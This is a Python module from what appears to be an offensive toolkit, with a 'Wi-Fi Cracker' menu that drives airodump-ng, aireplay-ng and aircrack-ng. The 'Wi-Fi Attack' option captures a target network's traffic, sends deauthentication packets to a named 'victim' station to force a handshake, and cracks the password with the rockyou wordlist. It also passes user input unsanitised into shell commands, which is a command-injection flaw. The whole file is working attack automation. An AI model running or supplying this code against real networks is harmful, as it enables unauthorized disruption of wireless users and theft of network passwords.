from utils.helpers import clear_screen
from utils.colors import *
import os
import time
import subprocess



def execute_terminal_command(terminal_command):
    """Function to open terminal with the generated commands."""
    try:
        subprocess.Popen(terminal_command)
    except Exception as e:
        print(f" [-] Error launching msfconsole: {e}")


def wifi_attack():
    """Main function for Wi-Fi options."""
    clear_screen()
    print("‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
    print("                 -+= Wi-Fi Cracker =+-            ")
    print("__________________________________________________")
    print("\n")
    print(" [1] Wi-Fi bug Fixer\n")
    print(" [2] Wi-Fi Attack\n")
    wifi_choice = input("Enter your choice: ")


    if wifi_choice == "1":
        clear_screen()
        os.system("ifconfig wlan0 down")
        os.system("iwconfig wlan0 mode monitor")
        os.system("airmon-ng check kill")
        os.system("kill all")
        print("\nAll PPID have been deleted\n")
        os.system("airmon-ng check kill")
        os.system("ifconfig wlan0 down")
        os.system("iwconfig wlan0 mode monitor")
        os.system("airmon-ng")

    elif wifi_choice == "2":
        clear_screen()
        print("Starting Wi-Fi Attack\n")
        name = input("Enter your adapter's name: ")
        print("\nLet's enable monitor mode!")
        os.system(f"ifconfig {name} down && iwconfig {name} mode monitor && ifconfig {name} up")
        time.sleep(3)
        print(f"Mode monitor in {name} has changed successfully!\n")
        print("‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾\n")
        print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* : \n")
        print("_________________________________________________________")
        time.sleep(5)
        clear_screen()
        os.system(f"airodump-ng {name}")

        bssidName = input("Enter Bssid Name: ")
        channel = input("Enter Channel: ")
        bssid = input("Enter Bssid: ")

        terminal_command = ['exo-open', '--launch', 'TerminalEmulator', 'airodump-ng', '-c', f"{channel}",
                            "--bssid", f"{bssid}", f"{name}", "-w", f"/root/Desktop/{bssidName}"]
        execute_terminal_command(terminal_command)

        print(f"\nPCAP file saved in /root/Desktop/{bssidName}-01.cap\n")
        attacks = input("Enter Number of Attacks (10-100): ")
        bssid2 = input(f"Enter Bssid (Press Enter to use '{bssid}'): ") or bssid
        station = input("Enter Victim's Station: ")

        os.system(f"aireplay-ng --deauth {attacks} -a {bssid2} -c {station} {name}")
        print()
        time.sleep(5)

        pcap_path = input("Enter PCAP File Path: ")
        wordlist_path = input("Enter Wordlist Path (default: /usr/share/wordlists/rockyou.txt): ") or "/usr/share/wordlists/rockyou.txt"

        clear_screen()
        os.system(f"aircrack-ng -w {wordlist_path} {pcap_path}")
        print()
        input("Press Enter To Finish")


    else:
        print("[-] Invalid choice.")











